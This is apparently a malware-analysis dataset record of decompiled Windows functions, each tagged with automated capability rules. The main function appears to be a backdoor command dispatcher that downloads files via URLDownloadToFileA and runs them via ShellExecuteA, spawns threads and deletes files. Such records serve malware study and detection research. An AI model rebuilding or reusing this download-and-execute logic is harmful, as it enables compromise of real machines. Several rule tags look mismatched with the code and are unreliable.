fcn.00405a48();\n                                uStack2276 = 0x499dc3;\n                                fcn.004059a4();\n                                uStack2276 = 0x499dce;\n                                fcn.00405504();\n                                uStack2276 = 8;\n                                uStack2280 = 0x40;\n                                puStack2284 = 0x499dd7;\n                                iStack464 = sub.kernel32.dll_LocalAlloc_1();\n                                puStack2284 = 0x499df7;\n                                iStack432 = iStack464;\n                                fcn.004054c0();\n                                puStack2284 = 0x499dff;\n                                uVar5 = fcn.00409dd8();\n                                *(iStack464 + 4) = uVar5;\n                                puStack2284 = &fcn.00493dac::var_4h;\n                                uStack2288 = 0;\n                                iStack2292 = iStack432;\n                                pcStack2296 = fcn.00485b40;\n                                uStack2300 = 0;\n                                uStack2304 = 0;\n                                uStack2308 = 0x499e23;\n                                uStack2308 = sub.kernel32.dll_CreateThread();\n                                puStack2312 = 0x499e29;\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            puStack2312 = &stack0xfffff994;\n                            puStack2316 = 0x499e42;\n                            fcn.00405964();\n                            puStack2316 = 0x499e52;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2316 = 0x499e6a;\n                                fcn.004059a4();\n                                uVar13 = 1;\n                                uStack2320 = 0x499f5e;\n                                pcStack2324 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff6ec;\n                                puStack2316 = &stack0xfffffffc;\n                                fcn.00405964();\n                                fcn.004096d8();\n                                fcn.00405894();\n                                if (!uVar13) {\n                                    fcn.00405964();\n                                    fcn.004096d8();\n                                    fcn.00405894();\n                                    if (!uVar13) {\n                                        fcn.00405784();\n                                    }\n                                }\n                                fcn.004058fc();\n                                sub.shell32.dll_ShellExecuteA();\n                                fcn.0048c190();\n                                fcn.00405800();\n                                fcn.004938a4();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = pcStack1668;\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048c190();\n                                fcn.00405784();\n                                fcn.004938a4();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.004058fc();\n                                sub.shell32.dll_ShellExecuteA();\n                                fcn.0048c190();\n                                fcn.00405800();\n                                fcn.004938a4();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                pcVar10 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff690;\n                                fcn.0048c190();\n                                fcn.00405784();\n                                fcn.004938a4();\n                                sub.kernel32.dll_GetCurrentProcessId();\n                                fcn.0048abec();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = pcVar10;\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048c190();\n                                fcn.00405784();\n                                fcn.004938a4();\n                                uVar13 = 1;\n                                fcn.00492f94();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                uVar13 = 1;\n                                fcn.0040ee40(&stack0xfffff950, *0x49b98c);\n                                fcn.00405504();\n                                fcn.0048ca88();\n                                fcn.00405964();\n                                fcn.00405894();\n                                if (!uVar13) {\n                                    fcn.00405784();\n                                }\n                                puVar11 = var_8h;\n                                if (var_8h != NULL) {\n                                    puVar11 = var_8h[-1];\n                                }\n                                if (*(var_8h + -1 + puVar11) == '/') {\n                                    puStack496 = var_8h;\n                                    if (var_8h != NULL) {\n                                        puStack496 = var_8h[-1];\n                                    }\n                                    puStack500 = var_8h;\n                                    if (var_8h != NULL) {\n                                        puStack500 = var_8h[-1];\n                                    }\n                                    fcn.004059a4();\n                                }\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.004058fc();\n                                fcn.004058fc();\n                                iVar3 = sub.URLMON.DLL_URLDownloadToFileA();\n                                if (iVar3 != 0) {\n                                    fcn.0048c190();\n                                    fcn.00405784();\n                                    fcn.004938a4();\n                                    *in_FS_OFFSET = NULL;\n                                    goto code_r0x0049b71b;\n                                }\n                                fcn.0048c190();\n                                fcn.00405784();\n                                fcn.004938a4();\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.004058fc();\n                                sub.shell32.dll_ShellExecuteA();\n                                uVar13 = 1;\n                                fcn.00492f94();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405504();\n                                uVar13 = 1;\n                                fcn.0040ee40(&stack0xfffff928, *0x49b98c);\n                                fcn.00405504();\n                                fcn.0048ca88();\n                                fcn.00405964();\n                                fcn.00405894();\n                                if (!uVar13) {\n                                    fcn.00405784();\n                                }\n                                puVar11 = var_ch;\n                                if (var_ch != NULL) {\n                                    puVar11 = var_ch[-1];\n                                }\n                                if (*(var_ch + -1 + puVar11) == '/') {\n                                    puStack504 = var_ch;\n                                    if (var_ch != NULL) {\n                                        puStack504 = var_ch[-1];\n                                    }\n                                    pcStack508 = var_ch;\n                                    if (var_ch != NULL) {\n                                        pcStack508 = var_ch[-1];\n                                    }\n                                    fcn.004059a4();\n                                }\n                                fcn.0048c190();\n                                fcn.00405784();\n                                fcn.004938a4();\n                                fcn.0048d2c8();\n                                fcn.0048d214();\n                                fcn.00405738();\n                                fcn.004058fc();\n                                fcn.004058fc();\n                                iVar3 = sub.URLMON.DLL_URLDownloadToFileA();\n                                uVar13 = iVar3 == 0;\n                                if (!uVar13) {\n                                    fcn.0048c190();\n                                    fcn.00405784();\n                                    fcn.004938a4();\n                                    *in_FS_OFFSET = NULL;\n                                    goto code_r0x0049b71b;\n                                }\n                                fcn.0048c190();\n                                fcn.00405784();\n                                fcn.004938a4();\n                                fcn.0048d2c8();\n                                fcn.0048d214();\n                                fcn.00405738();\n                                fcn.004058fc();\n                                sub.shell32.dll_ShellExecuteA();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                sub.kernel32.dll_CreateThread();\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0047fc68();\n                                fcn.00405784();\n                                fcn.004938a4();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.004058fc();\n                                fcn.00405664();\n                                uStack512 = uStack1812;\n                                fcn.004058fc();\n                                iVar3 = sub.kernel32.dll_DeleteFileA();\n                                uStack516 = uStack516 & 0xffffff | 1 - (iVar3 == 0) << 0x18;\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.0048e158();\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.0048e158();\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.0047f388();\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                fcn.0048e0b0();\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                uStack520 = uStack1840;\n                                fcn.004058fc();\n                                iVar3 = sub.kernel32.dll_DeleteFileA();\n                                puStack524 = puStack524 & 0xffffff | 1 - (iVar3 == 0) << 0x18;\n                                fcn.0048d2c8();\n                                fcn.00405738();\n                                uStack528 = uStack1844;\n                                fcn.004058fc();\n                                iVar3 = sub.kernel32.dll_DeleteFileA();\n                                uVar13 = iVar3 == 0;\n                                uStack532 = uStack532 & 0xffffff | (iVar3 != 0) << 0x18;\n                                puStack2560 = 0x49a852;\n                                fcn.0047f628();\n                                puStack2560 = 0x49a863;\n                                fcn.00493ce0(arg_8h_00);\n                            }\n                            puStack2560 = 0x49a87d;\n                            fcn.00405964();\n                            puStack2560 = 0x49a88d;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2560 = 0x49a8a1;\n                                fcn.004059a4();\n                                puStack2560 = 0x49a8ae;\n                                fcn.00405894();\n                                if (uVar13) {\n                                    **0x4a4f98 = 1;\n                                }\n                                else {\n                                    **0x4a4f98 = 0;\n                                }\n                            }\n                            puStack2560 = &stack0xfffff8c0;\n                            puStack2564 = 0x49a8db;\n                            fcn.00405964();\n                            puStack2564 = 0x49a8eb;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2564 = 0x49a8ff;\n                                fcn.004059a4();\n                                puStack2564 = &fcn.00493dac::var_4h;\n                                uStack2568 = 0;\n                                uStack2572 = 0x49a90d;\n                                uStack2572 = fcn.004058fc();\n                                pcStack2576 = fcn.00485988;\n                                uStack2580 = 0;\n                                uStack2584 = 0;\n                                puStack2588 = 0x49a91c;\n                                sub.kernel32.dll_CreateThread();\n                            }\n                            puStack2588 = &stack0xfffff8bc;\n                            puStack2592 = 0x49a935;\n                            fcn.00405964();\n                            puStack2592 = 0x49a945;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2592 = 0x49a959;\n                                fcn.004059a4();\n                                puStack2592 = &fcn.00493dac::var_4h;\n                                uStack2596 = 0;\n                                uStack2600 = 0x49a967;\n                                uStack2600 = fcn.004058fc();\n                                pcStack2604 = fcn.004877c0;\n                                uStack2608 = 0;\n                                uStack2612 = 0;\n                                puStack2616 = 0x49a976;\n                                sub.kernel32.dll_CreateThread();\n                            }\n                            puStack2616 = &stack0xfffff8b8;\n                            puStack2620 = 0x49a98f;\n                            fcn.00405964();\n                            puStack2620 = 0x49a99f;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2620 = 0x49a9b3;\n                                fcn.004059a4();\n                                puStack2620 = &fcn.00493dac::var_4h;\n                                uStack2624 = 0;\n                                uStack2628 = 0x49a9c1;\n                                uStack2628 = fcn.004058fc();\n                                pcStack2632 = fcn.00487ba8;\n                                uStack2636 = 0;\n                                uStack2640 = 0;\n                                puStack2644 = 0x49a9d0;\n                                sub.kernel32.dll_CreateThread();\n                            }\n                            puStack2644 = &stack0xfffff8b4;\n                            puStack2648 = 0x49a9e9;\n                            fcn.00405964();\n                            puStack2648 = 0x49a9f9;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2648 = 0x49aa0d;\n                                fcn.004059a4();\n                                puStack2648 = 0x49aa1a;\n                                fcn.004054c0();\n                                puStack2648 = 0x49aa29;\n                                fcn.0048e914();\n                            }\n                            puStack2648 = &stack0xfffff8b0;\n                            uStack2652 = 0x49aa42;\n                            fcn.00405964();\n                            uStack2652 = 0x49aa52;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uStack2652 = 0x49aa66;\n                                fcn.004059a4();\n                                uStack2652 = 0x49cf70;\n                                uStack2656 = 0;\n                                puStack2660 = 0x49aa72;\n                                sub.user32.dll_GetSystemMetrics();\n                                puStack2660 = 0x49aa7d;\n                                fcn.00409c6c();\n                                puStack2660 = in_stack_fffff8a8;\n                                uStack2664 = 0x49b8bc;\n                                uStack2668 = 1;\n                                puStack2672 = 0x49aa8f;\n                                sub.user32.dll_GetSystemMetrics();\n                                puStack2672 = 0x49aa9a;\n                                fcn.00409c6c();\n                                puStack2672 = puVar4;\n                                puStack2676 = 0x49aab0;\n                                fcn.00405800();\n                                puStack2676 = 0x49aabb;\n                                fcn.004938a4();\n                            }\n                            puStack2676 = &stack0xfffff8a0;\n                            puStack2680 = 0x49aad4;\n                            fcn.00405964();\n                            puStack2680 = 0x49aae4;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2680 = 0x49aafc;\n                                fcn.004059a4();\n                                puStack2680 = &fcn.00493dac::var_ch;\n                                puStack2684 = 0x49ab0d;\n                                fcn.00405a48();\n                                puStack2684 = 0x49ab1d;\n                                fcn.00405964();\n                                puStack2684 = 0x49ab2a;\n                                fcn.00405a48();\n                                puStack2684 = 0x49ab39;\n                                fcn.004059a4();\n                                puStack2684 = &fcn.00493dac::var_10h;\n                                puStack2688 = 0x49ab4a;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                puStack2688 = 0x49ab5a;\n                                fcn.00405964();\n                                puStack2688 = 0x49ab67;\n                                fcn.00405a48();\n                                puStack2688 = 0x49ab76;\n                                fcn.004059a4();\n                                puStack2688 = 0x49ab81;\n                                fcn.00405504();\n                                puStack2688 = 0x49ab89;\n                                puStack2688 = fcn.00409dd8();\n                                puStack2692 = 0x49ab92;\n                                fcn.00409dd8();\n                                puStack2688 = 0x49ab9d;\n                                fcn.0048742c();\n                            }\n                            puStack2688 = &stack0xfffff89c;\n                            puStack2692 = 0x49abb6;\n                            fcn.00405964();\n                            puStack2692 = 0x49abc6;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2692 = 0x49abda;\n                                fcn.004059a4();\n                                puStack2696 = 0x49ac21;\n                                pcStack2700 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff574;\n                                puStack2704 = 0x49abf6;\n                                puStack2692 = &stack0xfffffffc;\n                                fcn.00431540();\n                                puStack2704 = 0x49ac0c;\n                                fcn.00405784();\n                                puStack2704 = 0x49ac17;\n                                fcn.004938a4();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = pcStack2700;\n                            }\n                            puStack2692 = &stack0xfffff890;\n                            puStack2696 = 0x49ac56;\n                            fcn.00405964();\n                            puStack2696 = 0x49ac66;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2696 = 0x49ac7a;\n                                fcn.004059a4();\n                                puStack2696 = 0x49ac82;\n                                cVar1 = fcn.0048f134();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    puStack2696 = 0x49ac90;\n                                    fcn.004938a4();\n                                }\n                            }\n                            puStack2696 = &stack0xfffff88c;\n                            pcStack2700 = 0x49aca9;\n                            fcn.00405964();\n                            pcStack2700 = 0x49acb9;\n                            fcn.00405894();\n                            if (uVar13) {\n                                pcStack2700 = 0x49accd;\n                                fcn.004059a4();\n                                pcStack2700 = 0x49acd5;\n                                fcn.0048f18c();\n                            }\n                            pcStack2700 = &stack0xfffff888;\n                            puStack2704 = 0x49acee;\n                            fcn.00405964();\n                            puStack2704 = 0x49acfe;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2704 = 0x49ad12;\n                                fcn.004059a4();\n                                puStack2704 = &fcn.00493dac::var_ch;\n                                puStack2708 = 0x49ad23;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                puStack2708 = 0x49ad33;\n                                fcn.00405964();\n                                puStack2708 = 0x49ad40;\n                                fcn.00405a48();\n                                puStack2708 = 0x49ad4f;\n                                fcn.004059a4();\n                                puStack2708 = 0x49ad57;\n                                fcn.00409dd8();\n                                puStack2708 = 0x49ad5f;\n                                fcn.00445a88();\n                            }\n                            puStack2708 = &fcn.00493dac::var_778h;\n                            puStack2712 = 0x49ad78;\n                            fcn.00405964();\n                            puStack2712 = 0x49ad88;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2712 = 0x49ad9c;\n                                fcn.004059a4();\n                                puStack2716 = 0x49adf8;\n                                puStack2720 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff560;\n                                pcVar10 = NULL;\n                                puStack2712 = &stack0xfffffffc;\n                                sub.ole32.dll_CoInitialize();\n                                fcn.00423344();\n                                fcn.00415950();\n                                fcn.0041143c(0, &fcn.00493dac::var_38h, 0x49d044, &fcn.00493dac::var_8h);\n                                fcn.00416100();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = pcVar10;\n                            }\n                            puStack2716 = &stack0xfffff87c;\n                            puStack2720 = 0x49ae1b;\n                            fcn.00405964();\n                            puStack2720 = 0x49ae2b;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2720 = 0x49ae43;\n                                fcn.004059a4();\n                                puStack2720 = &fcn.00493dac::var_ch;\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                iVar3 = fcn.00405a48(&fcn.00493dac::var_10h);\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                fcn.00481400();\n                                fcn.00493ce0(arg_8h);\n                            }\n                            fcn.00405964(&stack0xfffff874);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405738();\n                                fcn.0048fdec(0x49d070);\n                                fcn.004900f0(0x49d094, var_8h, 0x49d088, puStack1940);\n                                fcn.004900f0(0x49b8bc, puStack1944);\n                                fcn.00490028(0x49b8bc, puVar14);\n                                uVar13 = 1;\n                                fcn.0048ff1c(0x49b8bc, puStack1952);\n                                fcn.0048ff1c(0x49d0a0, uStack1956);\n                                fcn.00405800(0x49d0ac, uStack1960);\n                                fcn.004938a4();\n                            }\n                            fcn.00405964(&stack0xfffff854);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.0048d2c8();\n                                fcn.00405800(var_8h, 0x49c3d4, puStack1972);\n                                puStack536 = puStack1968;\n                                uVar5 = fcn.004058fc();\n                                iVar3 = sub.kernel32.dll_DeleteFileA(uVar5);\n                                uVar2 = 1 - (iVar3 == 0);\n                                uStack540 = uStack540 & 0xffffff | uVar2 << 0x18;\n                                uVar13 = uVar2 == 0;\n                                if (!uVar13) {\n                                    fcn.004938a4();\n                                }\n                            }\n                            fcn.00405964(&stack0xfffff848);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_ch);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_10h);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                cVar1 = fcn.0040a168();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    *in_FS_OFFSET = &fcn.00493dac::var_14h;\n                                    goto code_r0x0049b71b;\n                                }\n                                puVar14 = &stack0xfffff844;\n                                fcn.00409dd8(puVar14, &stack0xfffffffc);\n                                fcn.0049029c(puVar14);\n                                fcn.00493ce0(puVar14);\n                            }\n                            fcn.00405964(&stack0xfffff840);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_ch);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_10h);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                iVar3 = fcn.00405a48(&fcn.00493dac::var_14h);\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                fcn.0048a0fc(var_18h);\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.00489ee4();\n                            }\n                            fcn.00405964(&stack0xfffff83c);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00489ce0();\n                            }\n                            fcn.00405964(&stack0xfffff838);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_ch);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_10h);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_14h);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                iVar3 = fcn.00405a48(&fcn.00493dac::var_18h);\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                puVar4 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n                                puStack428 = puVar4;\n                                uVar5 = fcn.00409dd8();\n                                *puVar4 = uVar5;\n                                uVar5 = fcn.0048a348();\n                                puVar4[1] = uVar5;\n                                uVar5 = fcn.0048a348();\n                                puVar4[2] = uVar5;\n                                uVar5 = fcn.0048a348();\n                                puVar4[3] = uVar5;\n                                fcn.004054c0();\n                                uVar5 = sub.kernel32.dll_CreateThread\n                                                  (0, 0, fcn.0048a56c, puStack428, 0, &fcn.00493dac::var_4h);\n                                sub.kernel32.dll_CloseHandle_1(uVar5);\n                            }\n                            fcn.00405964(&stack0xfffff834);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_ch);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                if (**0x4a4f60 != NULL) {\n                                    uVar5 = fcn.004058fc(**0x4a4f7c);\n                                    uVar5 = fcn.00409dd8(**0x4a4dbc, uVar5);\n                                    (***0x4a4f60)(uVar5);\n                                    *in_FS_OFFSET = pcStackY2996;\n                                    goto code_r0x0049b71b;\n                                }\n                                iVar3 = sub.kernel32.dll_LocalAlloc_1(0x40, 8);\n                                iStack468 = iVar3;\n                                fcn.004054c0();\n                                uVar13 = iStack468 == -4;\n                                fcn.004054c0();\n                                uVar5 = sub.kernel32.dll_CreateThread\n                                                  (0, 0, fcn.004926f8, iVar3, 0, &fcn.00493dac::var_4h);\n                                sub.kernel32.dll_CloseHandle_1(uVar5);\n                            }\n                            fcn.00405964(&fcn.00493dac::var_7cch);\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48(&fcn.00493dac::var_ch);\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                if (**0x4a5054 == 0) {\n                                    uVar5 = sub.kernel32.dll_LocalAlloc_1(0x40, 8);\n                                    uStack472 = uVar5;\n                                    fcn.004054c0();\n                                    fcn.004054c0();\n                                    in_stack_fffff458 = fcn.004926f8;\n                                    pcStackY2996 = sub.kernel32.dll_CreateThread\n                                                             (0, 0, fcn.004926f8, uVar5, 0, &fcn.00493dac::var_4h);\n                                    sub.kernel32.dll_CloseHandle_1();\n                                }\n                            }\n                            *in_FS_OFFSET = pcStackY2996;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0049b71b:\n    *in_FS_OFFSET = in_stack_fffff458;\n    fcn.00405490(0x49b879);\n    fcn.00406f3c();\n    fcn.00405490();\n    fcn.00406864();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406024();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.00405fd8();\n    fcn.00411434();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 54750
    },
    "004015c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015c0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    param_1 = param_1 + -4;\n    iVar1 = -param_1;\n    do {\n        *(iVar1 + param_2 + param_1) = ROUND(*(iVar1 + in_EAX + param_1));\n        iVar1 = iVar1 + 8;\n    } while (iVar1 < 0);\n    *(iVar1 + param_2 + param_1) = *(iVar1 + in_EAX + param_1);\n    return;\n}\n",
        "token_count": 143
    },
    "004016e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004016e8(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    fcn.0040167c();\n    puVar3 = sub.kernel32.dll_VirtualAlloc(0, 0x13fff0, 0x1000, 4);\n    puVar1 = *0x4a670c;\n    if (puVar3 != NULL) {\n        *puVar3 = 0x4a6708;\n        puVar2 = puVar3;\n        puVar3[1] = *0x4a670c;\n        *0x4a670c = puVar2;\n        *puVar1 = puVar3;\n        puVar3[0x4fffb] = 2;\n        *0x4a6720 = 0x13ffe0 - in_EAX;\n        *0x4a671c = puVar3 + (0x13fff0 - in_EAX);\n        iVar4 = *0x4a671c;\n        *(*0x4a671c + -4) = in_EAX | 2;\n        return iVar4;\n    }\n    *0x4a6720 = 0;\n    return 0;\n}\n",
        "token_count": 292
    },
    "004022c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004022c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (*(in_EAX + -4) & 0xfffffff0) + in_EAX;\n    if ((*(iVar1 + -4) & 0xfffffff0) == 0) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "00402324": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402324(int32_t *param_1, int32_t **param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    *param_2 = in_EAX + 8;\n    iVar1 = *in_EAX;\n    if ((in_EAX == *(iVar1 + 0x10)) && (*(iVar1 + 8) < *(iVar1 + 0xc) || *(iVar1 + 8) == *(iVar1 + 0xc))) {\n        *param_1 = *(iVar1 + 8) + -1;\n        return;\n    }\n    *param_1 = in_EAX + ((in_EAX[-1] & 0xfffffff0U) - *(iVar1 + 2));\n    return;\n}\n",
        "token_count": 176
    },
    "00403410": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nfloat10 fcn.00403410(float10 param_1)\n\n{\n    return param_1 - ROUND(param_1);\n}\n",
        "token_count": 28
    },
    "0040572c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040572c(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0040639c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040639c(void)\n\n{\n    fcn.00405cac();\n    return 0;\n}\n",
        "token_count": 26
    },
    "004066cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066cc(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = *in_EAX;\n    iVar5 = *arg_8h;\n    if (iVar5 < 1) {\n        if (iVar5 < 0) {\n            fcn.00403040();\n        }\n        fcn.004066c4();\n    }\n    else {\n        var_10h = 0;\n        if (piVar3 != NULL) {\n            var_10h = piVar3[-1];\n            piVar3 = piVar3 + -2;\n        }\n        iVar4 = in_EDX + *(in_EDX + 1);\n        iVar1 = *(iVar4 + 2);\n        piVar2 = *(iVar4 + 6);\n        if (piVar2 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = *piVar2;\n        }\n        if ((iVar5 * iVar1) / iVar5 != iVar1) {\n            fcn.00403040();\n        }\n        if ((piVar3 == NULL) || (*piVar3 == 1)) {\n            if ((iVar5 < var_10h) && (iVar4 != 0)) {\n                fcn.004066bc();\n            }\n            fcn.00402f24();\n        }\n        else {\n            *piVar3 = *piVar3 + -1;\n            piVar3 = fcn.00402ef0();\n            var_14h = var_10h;\n            if (iVar5 < var_10h) {\n                var_14h = iVar5;\n            }\n            if (iVar4 == 0) {\n                fcn.004030ec();\n            }\n            else {\n                fcn.00403ae4();\n                fcn.004066ac(var_14h);\n            }\n        }\n        *piVar3 = 1;\n        piVar3[1] = iVar5;\n        fcn.00403ae4();\n        if ((1 < in_ECX) && (-1 < iVar5 + -1)) {\n            do {\n                fcn.004066cc(arg_8h + 1);\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        *in_EAX = piVar3 + 2;\n    }\n    return;\n}\n",
        "token_count": 631
    },
    "004072bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
